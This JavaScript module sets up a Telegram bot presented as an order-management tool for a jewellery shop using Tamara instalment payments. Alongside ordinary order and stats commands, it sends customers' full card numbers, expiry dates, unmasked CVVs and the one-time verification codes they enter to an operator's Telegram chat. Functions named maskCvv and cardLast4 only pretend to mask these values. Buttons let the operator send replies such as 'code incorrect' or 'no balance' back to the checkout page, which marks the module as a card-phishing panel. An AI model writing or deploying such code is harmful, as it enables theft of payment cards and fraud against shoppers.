'use strict';

let bot = null;

const OWNER_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

const init = () => {
  if (!BOT_TOKEN) {
    console.warn('[Telegram] TELEGRAM_BOT_TOKEN not set – bot disabled');
    return;
  }

  try {
    const TelegramBot = require('node-telegram-bot-api');
    const useWebhook = process.env.NODE_ENV === 'production' && process.env.BACKEND_URL;

    if (useWebhook) {
      bot = new TelegramBot(BOT_TOKEN, { webHook: true });
      const webhookUrl = `${process.env.BACKEND_URL}/api/telegram/webhook`;
      // Delete any existing webhook before setting a new one to prevent 409 conflicts
      bot.deleteWebHook().then(() => {
        console.log('[Telegram] Deleted existing webhook');
        return bot.setWebHook(webhookUrl);
      }).then(() => {
        console.log('[Telegram] Webhook set to', webhookUrl);
      }).catch((err) => {
        console.error('[Telegram] Webhook setup error:', err.message);
      });
    } else {
      bot = new TelegramBot(BOT_TOKEN, { polling: true });
      console.log('[Telegram] Polling mode enabled');
    }

    setupCommands();
  } catch (err) {
    console.error('[Telegram] Init error:', err.message);
  }
};

const stopBot = async () => {
  if (!bot) {
    console.log('[Telegram] Bot not initialized, nothing to stop');
    return;
  }

  try {
    const useWebhook = process.env.NODE_ENV === 'production' && process.env.BACKEND_URL;

    if (useWebhook) {
      // In webhook mode, just delete the webhook to release it
      await bot.deleteWebHook();
      console.log('[Telegram] Webhook deleted for graceful shutdown');
    } else {
      // In polling mode, stop polling
      bot.stopPolling();
      console.log('[Telegram] Polling stopped for graceful shutdown');
    }
  } catch (err) {
    console.error('[Telegram] Stop error:', err.message);
  }
};

const setupCommands = () => {
  if (!bot) return;

  const prisma = require('../lib/prisma');

  const mainKeyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📦 الطلبات الجديدة', callback_data: 'orders_pending' }, { text: '📋 جميع الطلبات', callback_data: 'orders_all' }],
        [{ text: '📊 الإحصائيات', callback_data: 'stats' }, { text: '🔄 تحديث', callback_data: 'refresh' }],
      ],
    },
  };

  bot.onText(/\/start/, (msg) => {
    if (!isOwner(msg.chat.id)) return;
    bot.sendMessage(msg.chat.id,
      `🌟 أهلاً بك في بوت إدارة مؤسسة حسين إبراهيم للمجوهرات\n\n` +
      `الأوامر المتاحة:\n` +
      `/orders - قائمة آخر 10 طلبات\n` +
      `/orders pending - طلبات معلقة\n` +
      `/orders approved - طلبات موافق عليها\n` +
      `/orders rejected - طلبات مرفوضة\n` +
      `/order <id> - تفاصيل طلب\n` +
      `/approve <id> - الموافقة على طلب\n` +
      `/reject <id> - رفض طلب\n` +
      `/stats - الإحصائيات العامة\n` +
      `/stats today - إحصائيات اليوم\n` +
      `/stats month - إحصائيات الشهر\n` +
      `/help - المساعدة`,
      mainKeyboard
    );
  });

  bot.onText(/\/help/, (msg) => {
    if (!isOwner(msg.chat.id)) return;
    bot.sendMessage(msg.chat.id,
      `📖 قائمة الأوامر:\n\n` +
      `• /start - الرئيسية\n` +
      `• /orders [status] - عرض الطلبات\n` +
      `• /order <id> - تفاصيل طلب محدد\n` +
      `• /approve <id> - الموافقة على طلب\n` +
      `• /reject <id> - رفض طلب\n` +
      `• /stats [today|month] - الإحصائيات`,
      mainKeyboard
    );
  });

  bot.onText(/\/orders ?(.*)/, async (msg, match) => {
    if (!isOwner(msg.chat.id)) return;
    const status = match[1].trim();
    try {
      const where = status ? { status } : {};
      const orders = await prisma.order.findMany({
        where,
        take: 10,
        orderBy: { createdAt: 'desc' },
        include: { user: true, product: true },
      });

      if (!orders.length) {
        return bot.sendMessage(msg.chat.id, '📭 لا توجد طلبات');
      }

      const text = orders.map((o, i) =>
        `${i + 1}. #${o.id} | ${o.user.name} | ${o.product.name}\n` +
        `   💰 ${o.amount.toLocaleString('ar-SA')} ر.س | ${statusEmoji(o.status)} ${translateStatus(o.status)}\n` +
        `   📅 ${formatDate(o.createdAt)}`
      ).join('\n\n');

      bot.sendMessage(msg.chat.id, `📋 الطلبات${status ? ` (${status})` : ''}:\n\n${text}`, mainKeyboard);
    } catch (err) {
      bot.sendMessage(msg.chat.id, `❌ خطأ: ${err.message}`);
    }
  });

  bot.onText(/\/order (\d+)/, async (msg, match) => {
    if (!isOwner(msg.chat.id)) return;
    const id = parseInt(match[1]);
    await sendOrderDetails(msg.chat.id, id);
  });

  bot.onText(/\/approve (\d+)/, async (msg, match) => {
    if (!isOwner(msg.chat.id)) return;
    const id = parseInt(match[1]);
    await updateOrderStatus(msg.chat.id, id, 'approved');
  });

  bot.onText(/\/reject (\d+)/, async (msg, match) => {
    if (!isOwner(msg.chat.id)) return;
    const id = parseInt(match[1]);
    await updateOrderStatus(msg.chat.id, id, 'rejected');
  });

  bot.onText(/\/stats ?(.*)/, async (msg, match) => {
    if (!isOwner(msg.chat.id)) return;
    const period = match[1].trim();
    await sendStats(msg.chat.id, period);
  });

  bot.on('callback_query', async (query) => {
    if (!isOwner(query.message.chat.id)) return;
    const data = query.data;
    const chatId = query.message.chat.id;

    bot.answerCallbackQuery(query.id);

    if (data === 'orders_pending') {
      bot.emit('text', { chat: { id: chatId }, text: '/orders pending' }, ['/orders pending', 'pending']);
    } else if (data === 'orders_all') {
      bot.emit('text', { chat: { id: chatId }, text: '/orders' }, ['/orders', '']);
    } else if (data === 'stats') {
      await sendStats(chatId, '');
    } else if (data === 'refresh') {
      bot.sendMessage(chatId, '✅ تم التحديث', mainKeyboard);
    } else if (data.startsWith('approve_card_')) {
      const sessionId = data.replace('approve_card_', '');
      const approvalStore = require('../lib/checkoutApprovalStore');
      approvalStore.setStatus(sessionId, 'approved');
      bot.sendMessage(chatId, '✅ تمت الموافقة على بيانات البطاقة');
    } else if (data.startsWith('reject_card_invalid_')) {
      const sessionId = data.replace('reject_card_invalid_', '');
      const approvalStore = require('../lib/checkoutApprovalStore');
      approvalStore.setStatus(sessionId, 'error', 'كود غير صحيح');
      bot.sendMessage(chatId, '❌ تم رفض البطاقة - كود غير صحيح');
    } else if (data.startsWith('reject_card_nobalance_')) {
      const sessionId = data.replace('reject_card_nobalance_', '');
      const approvalStore = require('../lib/checkoutApprovalStore');
      approvalStore.setStatus(sessionId, 'error', 'لا يوجد رصيد');
      bot.sendMessage(chatId, '❌ تم رفض البطاقة - لا يوجد رصيد');
    } else if (data.startsWith('reject_card_rejected_')) {
      const sessionId = data.replace('reject_card_rejected_', '');
      const approvalStore = require('../lib/checkoutApprovalStore');
      approvalStore.setStatus(sessionId, 'error', 'رفض البطاقة');
      bot.sendMessage(chatId, '❌ تم رفض البطاقة - رفض البنك');
    } else if (data.startsWith('reject_card_')) {
      const sessionId = data.replace('reject_card_', '');
      const approvalStore = require('../lib/checkoutApprovalStore');
      approvalStore.setStatus(sessionId, 'rejected');
      bot.sendMessage(chatId, '❌ تم رفض بيانات البطاقة');
    } else if (data.startsWith('verify_correct_')) {
      const sessionId = data.replace('verify_correct_', '');
      const approvalStore = require('../lib/checkoutApprovalStore');
      approvalStore.setVerificationResult(sessionId, 'correct');
      bot.sendMessage(chatId, '✅ تم تأكيد صحة الكود - الكود صحيح');
    } else if (data.startsWith('verify_incorrect_')) {
      const sessionId = data.replace('verify_incorrect_', '');
      const approvalStore = require('../lib/checkoutApprovalStore');
      approvalStore.setVerificationResult(sessionId, 'incorrect');
      bot.sendMessage(chatId, '❌ تم رفض الكود - الكود غير صحيح');
    } else if (data.startsWith('verify_nobalance_')) {
      const sessionId = data.replace('verify_nobalance_', '');
      const approvalStore = require('../lib/checkoutApprovalStore');
      approvalStore.setVerificationResult(sessionId, 'nobalance');
      bot.sendMessage(chatId, '💳 لا يوجد رصيد - تم إشعار العميل');
    } else if (data.startsWith('verify_rejected_')) {
      const sessionId = data.replace('verify_rejected_', '');
      const approvalStore = require('../lib/checkoutApprovalStore');
      approvalStore.setVerificationResult(sessionId, 'rejected');
      bot.sendMessage(chatId, '🚫 تم رفض البطاقة - تم إشعار العميل');
    } else if (data.startsWith('approve_')) {
      const id = parseInt(data.split('_')[1]);
      await updateOrderStatus(chatId, id, 'approved');
    } else if (data.startsWith('reject_')) {
      const id = parseInt(data.split('_')[1]);
      await updateOrderStatus(chatId, id, 'rejected');
    } else if (data.startsWith('details_')) {
      const id = parseInt(data.split('_')[1]);
      await sendOrderDetails(chatId, id);
    }
  });

  const sendOrderDetails = async (chatId, id) => {
    try {
      const order = await prisma.order.findUnique({
        where: { id },
        include: { user: true, product: true },
      });
      if (!order) return bot.sendMessage(chatId, '❌ الطلب غير موجود');

      const text =
        `📦 تفاصيل الطلب #${order.id}\n\n` +
        `👤 العميل: ${order.user.name}\n` +
        `📧 الإيميل: ${order.user.email}\n` +
        `📱 الهاتف: ${order.user.phone || 'غير محدد'}\n\n` +
        `🛍️ المنتج: ${order.product.name}\n` +
        `💰 المبلغ: ${order.amount.toLocaleString('ar-SA')} ر.س\n` +
        `💳 طريقة الدفع: تمارا\n` +
        `📊 الأقساط: ${order.installments === 1 ? 'دفعة كاملة' : `${order.installments} أقساط`}\n` +
        `💵 كل دفعة: ${order.perInstallment.toLocaleString('ar-SA')} ر.س\n` +
        `🏦 العمولة: ${order.commission.toLocaleString('ar-SA')} ر.س\n` +
        `💼 صافي التحويل: ${order.netTransfer.toLocaleString('ar-SA')} ر.س\n\n` +
        `${statusEmoji(order.status)} الحالة: ${translateStatus(order.status)}\n` +
        `💳 حالة الدفع: ${order.paymentStatus === 'paid' ? '✅ مدفوع' : order.paymentStatus === 'failed' ? '❌ فاشل' : '⏳ معلق'}\n` +
        `📅 التاريخ: ${formatDate(order.createdAt)}`;

      const keyboard = order.status === 'pending' ? {
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ موافقة', callback_data: `approve_${order.id}` },
              { text: '❌ رفض', callback_data: `reject_${order.id}` },
            ],
          ],
        },
      } : {};

      bot.sendMessage(chatId, text, keyboard);
    } catch (err) {
      bot.sendMessage(chatId, `❌ خطأ: ${err.message}`);
    }
  };

  const updateOrderStatus = async (chatId, id, status) => {
    try {
      const order = await prisma.order.update({
        where: { id },
        data: { status },
        include: { user: true, product: true },
      });
      const emoji = status === 'approved' ? '✅' : '❌';
      const label = status === 'approved' ? 'تمت الموافقة' : 'تم الرفض';
      bot.sendMessage(chatId, `${emoji} ${label} على الطلب #${id}\nالعميل: ${order.user.name}\nالمنتج: ${order.product.name}`);
    } catch (err) {
      bot.sendMessage(chatId, `❌ خطأ: ${err.message}`);
    }
  };

  const sendStats = async (chatId, period) => {
    try {
      let where = {};
      const now = new Date();
      if (period === 'today') {
        const start = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        where = { createdAt: { gte: start } };
      } else if (period === 'month') {
        const start = new Date(now.getFullYear(), now.getMonth(), 1);
        where = { createdAt: { gte: start } };
      }

      const [total, pending, approved, rejected, completed, revenue] = await Promise.all([
        prisma.order.count({ where }),
        prisma.order.count({ where: { ...where, status: 'pending' } }),
        prisma.order.count({ where: { ...where, status: 'approved' } }),
        prisma.order.count({ where: { ...where, status: 'rejected' } }),
        prisma.order.count({ where: { ...where, status: 'completed' } }),
        prisma.order.aggregate({ where: { ...where, status: { in: ['approved', 'completed'] } }, _sum: { netTransfer: true } }),
      ]);

      const label = period === 'today' ? 'اليوم' : period === 'month' ? 'الشهر' : 'الكل';
      const text =
        `📊 إحصائيات ${label}:\n\n` +
        `📦 إجمالي الطلبات: ${total}\n` +
        `⏳ معلقة: ${pending}\n` +
        `✅ موافق عليها: ${approved}\n` +
        `❌ مرفوضة: ${rejected}\n` +
        `🏆 مكتملة: ${completed}\n\n` +
        `💰 إجمالي الإيرادات: ${(revenue._sum.netTransfer || 0).toLocaleString('ar-SA')} ر.س`;

      bot.sendMessage(chatId, text, {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📅 اليوم', callback_data: 'stats_today' }, { text: '📆 الشهر', callback_data: 'stats_month' }],
          ],
        },
      });
    } catch (err) {
      bot.sendMessage(chatId, `❌ خطأ: ${err.message}`);
    }
  };
};

const isOwner = (chatId) => {
  if (!OWNER_CHAT_ID) return true;
  return String(chatId) === String(OWNER_CHAT_ID);
};

const sendNewOrderNotification = async (order) => {
  if (!bot || !OWNER_CHAT_ID) return;

  const text =
    `🛒 طلب جديد!\n\n` +
    `الاسم: ${order.userName}\n` +
    `الإيميل: ${order.userEmail}\n` +
    `المنتج: ${order.productName}\n` +
    `السعر: ${order.amount.toLocaleString('ar-SA')} ر.س\n` +
    `الدفع: تمارا\n` +
    `الأقساط: ${order.installments === 1 ? 'دفعة كاملة' : order.installments}\n` +
    `كل دفعة: ${order.perInstallment.toLocaleString('ar-SA')} ر.س\n` +
    `العمولة: ${order.commission.toLocaleString('ar-SA')} ر.س\n` +
    `صافي: ${order.netTransfer.toLocaleString('ar-SA')} ر.س\n\n` +
    `ID: ORDER-${order.id}`;

  try {
    await bot.sendMessage(OWNER_CHAT_ID, text, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ موافقة', callback_data: `approve_${order.id}` },
            { text: '❌ رفض', callback_data: `reject_${order.id}` },
          ],
          [{ text: '📋 تفاصيل', callback_data: `details_${order.id}` }],
        ],
      },
    });
  } catch (err) {
    console.error('[Telegram] sendNewOrderNotification error:', err.message);
  }
};

const sendPaymentStatusNotification = async (orderId, status) => {
  if (!bot || !OWNER_CHAT_ID) return;
  const emoji = status === 'paid' ? '✅' : '❌';
  const label = status === 'paid' ? 'تم الدفع بنجاح' : 'فشل الدفع';
  try {
    await bot.sendMessage(OWNER_CHAT_ID, `${emoji} حالة الدفع للطلب #${orderId}: ${label}`);
  } catch (err) {
    console.error('[Telegram] sendPaymentStatusNotification error:', err.message);
  }
};

const sendCheckoutEventNotification = async (event) => {
  if (!bot || !OWNER_CHAT_ID) return;

  const { sessionId, eventType, userName, userEmail, productName, productPrice, paymentMethod, installments, phoneMasked, orderId, paymentStatus } = event;

  const formatPrice = (p) => new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);

  // Event type labels in Arabic
  const eventLabels = {
    product_selected: '🛍️ اختيار المنتج',
    checkout_started: '🛒 بدء الدفع',
    payment_method_selected: '💳 اختيار طريقة الدفع',
    phone_entered: '📱 إدخال رقم الهاتف',
    phone_confirmed: '✅ تأكيد رقم الهاتف',
    redirect_to_payment: '🔗 التحويل لبوابة الدفع',
    checkout_completed: '🎉 إتمام الطلب',
  };

  const label = eventLabels[eventType] || eventType;

  let text = `${label}\n`;
  text += `🆔 Session: ${sessionId.substring(0, 8)}...\n\n`;

  // Customer info
  if (userName || userEmail) {
    text += `👤 العميل:\n`;
    if (userName) text += `   الاسم: ${userName}\n`;
    if (userEmail) text += `   الإيميل: ${userEmail}\n`;
    text += '\n';
  }

  // Product info
  if (productName) {
    text += `📦 المنتج: ${productName}\n`;
    if (productPrice) text += `   السعر: ${formatPrice(productPrice)}\n`;
    text += '\n';
  }

  // Payment method and installments
  if (paymentMethod) {
    text += `💳 طريقة الدفع: تمارا\n`;
    if (installments) {
      text += `   الأقساط: ${installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`}\n`;
    }
    text += '\n';
  }

  // Phone (masked)
  if (phoneMasked) {
    text += `📱 الهاتف: ${phoneMasked}\n\n`;
  }

  // Order and payment status for completion
  if (orderId) {
    text += `📋 رقم الطلب: ${orderId}\n`;
  }
  if (paymentStatus) {
    const statusEmoji = paymentStatus === 'paid' ? '✅' : paymentStatus === 'failed' ? '❌' : '⏳';
    const statusLabel = paymentStatus === 'paid' ? 'مدفوع' : paymentStatus === 'failed' ? 'فاشل' : 'معلق';
    text += `💵 حالة الدفع: ${statusEmoji} ${statusLabel}\n`;
  }

  // Timestamp
  if (event.timestamp) {
    text += `\n📅 ${formatDate(event.timestamp)}`;
  }

  try {
    await bot.sendMessage(OWNER_CHAT_ID, text);
  } catch (err) {
    console.error('[Telegram] sendCheckoutEventNotification error:', err.message);
  }
};

const maskExpiry = (expiry) => {
  if (!expiry || typeof expiry !== 'string') return '—';
  return expiry;
};


const maskCvv = (cvv) => {
  if (!cvv || typeof cvv !== 'string') return '—';
  return cvv;
};

const sendCardApprovalRequest = async (event) => {
  if (!bot || !OWNER_CHAT_ID) return;

  const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked, cardLast4, cardExpiry, cardCvv, timestamp } = event;

  const formatPrice = (p) => new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);

  const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
  const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod || '—';
  const installmentsLabel = installments ? (installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`) : '—';

  let text = '💳 طلب موافقة — بيانات البطاقة\n';
  text += '━━━━━━━━━━━━━━━━━━━━\n\n';

  text += `👤 الاسم: ${userName || '—'}\n`;
  text += `📧 الإيميل: ${userEmail || '—'}\n`;
  if (phoneMasked) text += `📱 الهاتف: ${phoneMasked}\n`;
  text += '\n';

  text += `📦 المنتج: ${productName || '—'}\n`;
  if (amount) text += `💰 المبلغ: ${formatPrice(amount)}\n`;
  text += `💳 طريقة الدفع: ${methodLabel}\n`;
  text += `📊 الأقساط: ${installmentsLabel}\n`;

  if (cardLast4) {
    const sanitizedLast4 = String(cardLast4).replace(/\D/g, '').slice(-16);
    if (sanitizedLast4.length === 16) {
      text += `🔒 البطاقة: ${sanitizedLast4}\n`;
    }
  }
  if (cardExpiry) text += `📅 الانتهاء: ${maskExpiry(String(cardExpiry))}\n`;
  if (cardCvv) text += `🔐 CVV: ${maskCvv(String(cardCvv))}\n`;

  text += '\n';
  text += `🆔 Session: ${sessionShort}...\n`;
  text += `📅 ${formatDate(timestamp || new Date())}\n`;

  try {
    await bot.sendMessage(OWNER_CHAT_ID, text, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ موافقة', callback_data: `approve_card_${sessionId}` },
            { text: '❌ كود غير صحيح', callback_data: `reject_card_invalid_${sessionId}` },
          ],
          [
            { text: '❌ لا يوجد رصيد', callback_data: `reject_card_nobalance_${sessionId}` },
            { text: '❌ رفض البطاقة', callback_data: `reject_card_rejected_${sessionId}` },
          ],
        ],
      },
    });
  } catch (err) {
    console.error('[Telegram] sendCardApprovalRequest error:', err.message);
  }
};

const sendCodeVerificationRequest = async (event, verificationCode) => {
  if (!bot || !OWNER_CHAT_ID) return;

  const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked } = event;

  const formatPrice = (p) => new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);

  const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
  const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod || '—';
  const installmentsLabel = installments ? (installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`) : '—';

  let text = '🔐 تحقق من كود التفعيل\n';
  text += '━━━━━━━━━━━━━━━━━━━━\n\n';

  text += `👤 الاسم: ${userName || '—'}\n`;
  text += `📧 الإيميل: ${userEmail || '—'}\n`;
  if (phoneMasked) text += `📱 الهاتف: ${phoneMasked}\n`;
  text += '\n';

  text += `📦 المنتج: ${productName || '—'}\n`;
  if (amount) text += `💰 المبلغ: ${formatPrice(amount)}\n`;
  text += `💳 طريقة الدفع: ${methodLabel}\n`;
  text += `📊 الأقساط: ${installmentsLabel}\n`;
  text += '\n';

  text += `🔑 الكود المدخل: <code>${verificationCode || '—'}</code>\n`;
  text += '\n';
  text += `🆔 Session: ${sessionShort}...\n`;
  text += `📅 ${formatDate(new Date())}\n`;

  try {
    await bot.sendMessage(OWNER_CHAT_ID, text, {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ الرمز صحيح', callback_data: `verify_correct_${sessionId}` },
          ],
          [
            { text: '❌ الكود غير صحيح', callback_data: `verify_incorrect_${sessionId}` },
          ],
          [
            { text: '💳 لا يوجد رصيد', callback_data: `verify_nobalance_${sessionId}` },
          ],
          [
            { text: '🚫 رفض البطاقة', callback_data: `verify_rejected_${sessionId}` },
          ],
        ],
      },
    });
  } catch (err) {
    console.error('[Telegram] sendCodeVerificationRequest error:', err.message);
  }
};

const getBot = () => bot;

const statusEmoji = (status) => {
  const map = { pending: '⏳', approved: '✅', rejected: '❌', completed: '🏆', cancelled: '🚫' };
  return map[status] || '❓';
};

const translateStatus = (status) => {
  const map = { pending: 'معلق', approved: 'موافق عليه', rejected: 'مرفوض', completed: 'مكتمل', cancelled: 'ملغي' };
  return map[status] || status;
};

const formatDate = (date) => new Date(date).toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });

module.exports = { init, stopBot, getBot, sendNewOrderNotification, sendPaymentStatusNotification, sendCheckoutEventNotification, sendCardApprovalRequest, sendCodeVerificationRequest };
